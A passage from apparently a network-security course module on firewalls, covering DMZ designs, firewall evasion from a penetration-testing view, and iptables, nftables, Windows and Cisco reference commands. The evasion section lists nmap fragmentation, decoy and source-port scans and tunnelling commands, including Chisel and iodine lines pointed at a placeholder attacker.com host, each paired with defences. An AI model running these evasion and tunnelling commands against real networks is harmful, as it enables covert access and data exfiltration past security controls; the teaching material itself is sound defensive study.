**Pros**: Simple, low cost, single point of management
**Cons**: Single firewall = single point of failure. If the firewall is compromised, attacker has access to configure it — can allow traffic from DMZ to LAN.

### Dual Firewall DMZ (True DMZ)

Two separate firewalls from different vendors. The DMZ sits between them.

```
Internet
    │
    ▼
┌─────────────┐
│  FIREWALL 1 │  (External — Internet edge)
│  (Vendor A) │
└──────┬──────┘
       │
  ┌────▼─────────────────┐
  │         DMZ          │
  │  Web Server          │
  │  Mail Relay          │
  │  VPN Concentrator    │
  └────┬─────────────────┘
       │
┌──────▼──────┐
│  FIREWALL 2 │  (Internal — DMZ to LAN boundary)
│  (Vendor B) │
└──────┬──────┘
       │
  ┌────▼──────────────────┐
  │     Internal Network   │
  │  Servers, Workstations │
  └────────────────────────┘
```

**Pros**:
- Attacker who compromises Firewall 1 (or a DMZ host) still faces Firewall 2 before reaching internal network
- Different vendor = different vulnerability surface (a 0-day against Vendor A doesn't affect Vendor B)
- Defence in depth at the network perimeter

**Cons**: More complex, higher cost, dual management overhead

**Traffic rules in dual-firewall**:
```
Firewall 1 (External):
  Internet → DMZ: Allow TCP 80, 443 to web server only
  Internet → DMZ: Allow TCP 25 to mail relay only
  DMZ → Internet: Allow TCP 80, 443 (updates), TCP 25 (outbound mail)
  Internet → Internal: DENY ALL
  Internal → Internet: Allow via NAT

Firewall 2 (Internal):
  DMZ → Internal: DENY ALL (except specific app server → DB queries)
  Internal → DMZ: Allow (internal users browse to DMZ web servers)
  Internal → Internet: Allow via Firewall 1 (routing through DMZ)
```

### Screened Host Architecture

Single router (or firewall) protecting a bastion host (the DMZ host). The bastion host has two NICs — one on the internet-facing segment, one on the internal network.

Less common today — less isolation than a proper DMZ.

---

## 10. Firewall Evasion Techniques

### Pentest Lens — Firewall Evasion

**Attacker's goal**: Reach a target service or exfiltrate data despite firewall controls. Firewalls are not impenetrable — they make assumptions about "normal" traffic that can be exploited.

#### Fragmentation

Split a malicious payload across multiple IP fragments. Some stateless firewalls only inspect the first fragment (which contains the port numbers) and pass subsequent fragments without inspection. The target reassembles all fragments — the full malicious payload arrives.

```bash
# Nmap fragmentation — split packets into 8-byte fragments
nmap -f 192.168.1.1                # 8-byte fragments
nmap -ff 192.168.1.1               # 16-byte fragments
nmap --mtu 24 192.168.1.1          # Custom fragment size (must be multiple of 8)

# hping3 fragmentation
hping3 -f -p 80 192.168.1.1       # Fragmented packets
```

**Mitigation**: Stateful firewalls that reassemble fragments before inspection. Modern firewalls (ASA, Palo Alto) reassemble by default.

#### Port Evasion — Allowed Port Tunnelling

Many firewalls allow TCP 80 and TCP 443 outbound. Attackers tunnel arbitrary traffic over these ports.

**HTTP tunnelling**:
```bash
# HTTPTunnel — tunnel TCP over HTTP
hts -F localhost:22 80    # Server: forward port 80 to SSH on localhost:22
htc -F 8022:target.com:80 # Client: forward local 8022 through HTTP to target
ssh user@localhost -p 8022 # Connect to SSH through the HTTP tunnel
```

**DNS tunnelling** (covered in Module 3):
```bash
iodine -f -P password tunnel.attacker.com
# Tunnels IP over DNS queries/responses — only UDP 53 needed outbound
```

**ICMP tunnelling** (covered in Module 3):
```bash
icmptunnel -s    # Server
icmptunnel <server-IP>   # Client
```

**HTTPs/TLS tunnelling (most evasive)**:
Wrap C2 traffic in valid TLS. The firewall sees legitimate-looking HTTPS. Without SSL inspection, content is opaque.

```bash
# Chisel — HTTP/WebSocket tunnel (commonly used for pivoting)
chisel server -p 443 --tls-cert cert.pem --tls-key key.pem
chisel client https://attacker.com R:socks
```

#### Port Knocking

A firewall blocks a port (e.g., SSH 22) by default. Only after sending packets to a specific sequence of ports does the firewall open the target port for that source IP.

```bash
# Port knock sequence: TCP 7000, 8000, 9000 → opens port 22
knock 192.168.1.10 7000 8000 9000
ssh user@192.168.1.10    # Now allowed

# knockd — port knock daemon config
# /etc/knockd.conf:
# [openSSH]
# sequence    = 7000,8000,9000
# seq_timeout = 5
# command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
```

> [!tip] Port Knocking is Security Through Obscurity
> Port knocking provides minimal real security but is effective against automated scanning (bots don't knock). Anyone who captures network traffic can observe the knock sequence and replay it.

#### Firewall Fingerprinting

Identify what type of firewall is in use — each responds differently to probes.

```bash
# Nmap firewall evasion options
nmap -sA 192.168.1.0/24     # ACK scan — firewalled ports return nothing, unfiltered return RST
nmap -sW 192.168.1.0/24     # Window scan — examine window size in RST to distinguish open/filtered

# Firewalk — determine firewall rules by manipulating TTL
firewalk -S1-1024 -i eth0 192.168.1.1 192.168.1.10
# Sends packets with TTL set to expire one hop past the firewall
# If packet gets through firewall (port allowed), router beyond sends TTL exceeded
# If blocked by firewall, no ICMP TTL exceeded received → port is filtered

# p0f — passive OS/firewall fingerprinting
p0f -i eth0    # Passively fingerprint all passing traffic

# Nmap decoys — hide real scanner IP among fake IPs
nmap -D 10.0.0.1,10.0.0.2,ME,10.0.0.3 192.168.1.10
# ME = attacker's real IP somewhere in the list
# Firewall/IDS sees scan from multiple IPs — harder to attribute

# Nmap source port manipulation — firewall allows traffic from specific source ports
nmap --source-port 53 192.168.1.10    # Some firewalls trust DNS (port 53) source
nmap -g 80 192.168.1.10               # Same — source port 80

# Nmap timing evasion
nmap -T1 192.168.1.10    # Very slow — below many IDS thresholds
nmap --scan-delay 10s 192.168.1.10   # 10 second delay between probes
nmap --max-retries 1 192.168.1.10    # Single attempt per port
```

#### Protocol Confusion

Some firewalls only inspect traffic on expected ports. Sending non-standard traffic on allowed ports confuses inspection engines.

```bash
# Run SSH on port 443
# sshd_config: Port 443
# Client: ssh -p 443 user@target
# Firewall: sees TCP 443, assumes HTTPS, passes it through
```

#### IPv6 Bypass

If the firewall has IPv4 rules but IPv6 is active on the network with no equivalent rules:

```bash
# Nmap IPv6 scan — if IPv6 not firewalled
nmap -6 target.com
nmap -6 fe80::1%eth0    # Link-local target
```

#### Application-Layer Bypass (Against Basic Stateful Firewalls)

Use allowed application protocols as carriers for tunnelled traffic. HTTP CONNECT method — originally for proxies — can establish tunnels through HTTP-aware firewalls:

```bash
curl --proxy-tunnel http://proxy:3128 https://restricted-target.com
```

**Defender's counter — firewall evasion**:
- NGFW with App-ID: identifies application regardless of port — SSH on 443 identified as SSH, policy applied
- SSL/TLS inspection: decrypt and inspect HTTPS — tunnelling over TLS becomes visible
- Fragment reassembly: always reassemble before inspection (enabled by default on modern firewalls)
- Egress filtering: limit outbound to required services only (DNS to known resolvers, HTTP/S to approved categories)
- IDS/IPS: detect anomalous patterns (port scanning, unusual connection rates, DNS tunnelling volume)
- DNS monitoring: detect unusually long queries or high query rates (DNS tunnelling signatures)

---

## Quick Reference — Module 5

### iptables Quick Commands
```bash
iptables -L -v -n --line-numbers          # List all rules with counts
iptables -A INPUT -p tcp --dport 22 -j ACCEPT   # Allow SSH inbound
iptables -I INPUT 1 -s 1.2.3.4 -j DROP   # Block IP (insert at top)
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -P INPUT DROP                    # Set default policy to DROP
iptables-save > /etc/iptables/rules.v4   # Save rules
iptables-restore < /etc/iptables/rules.v4 # Load rules
```

### nftables Quick Commands
```bash
nft list ruleset                          # Show current ruleset
nft flush ruleset                         # Clear all rules
nft -f /etc/nftables.conf                # Load from file
nft add rule inet filter input tcp dport 22 accept   # Allow SSH
nft add element inet filter blocked_ips { 1.2.3.4 }  # Add to set
```

### Windows Firewall Quick Commands
```powershell
Get-NetFirewallRule | Where Enabled -eq True       # Active rules
New-NetFirewallRule -DisplayName "Allow SSH" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 22
Set-NetFirewallProfile -Profile Domain -DefaultInboundAction Block
netsh advfirewall show allprofiles                  # Legacy view
```

### Firewall Evasion Nmap Options
```bash
nmap -f target               # Fragment packets
nmap --mtu 24 target         # Custom MTU fragments
nmap -D decoy1,decoy2,ME target  # Decoy IPs
nmap --source-port 53 target # Trust source port
nmap -T1 target              # Slow scan (IDS evasion)
nmap -sA target              # ACK scan (firewall rule mapping)
nmap --scan-delay 5s target  # Delay between probes
```

### Firewall Type Comparison
| Type | Inspects | State | App Aware | Evasion Resistance |
|------|---------|-------|-----------|-------------------|
| Packet Filter | IP/Port headers | No | No | Low |
| Stateful | IP/Port/State | Yes | No | Medium |
| App Proxy | Full app layer | Yes | Partial | High |
| NGFW | Full stack + TLS | Yes | Full | Highest |

### Cisco ASA Key Commands
```cisco
show access-list              ! ACLs with hit counts
show conn                     ! Active connections
show xlate                    ! NAT translations
show nat                      ! NAT rules
show interface ip brief        ! Interface IPs and status
show logging                  ! Firewall log
```

---

## Related Notes
- [[Module-04-Network-Security]] — Security zones that firewalls enforce, CIA Triad
- [[Module-02-Devices-Infrastructure]] — ACLs on Cisco routers (packet filter)
- [[Module-06-Network-Monitoring]] — IDS/IPS that complement firewall controls
- [[Module-09-VPNs-Remote-Access]] — VPN traffic through firewalls, split tunnelling
- [[Module-10-Enterprise-Infrastructure]] — Three-tier architecture firewall placement
- [[Module-12-Pentest-Perspective]] — Firewall evasion in engagement context, firewall enumeration
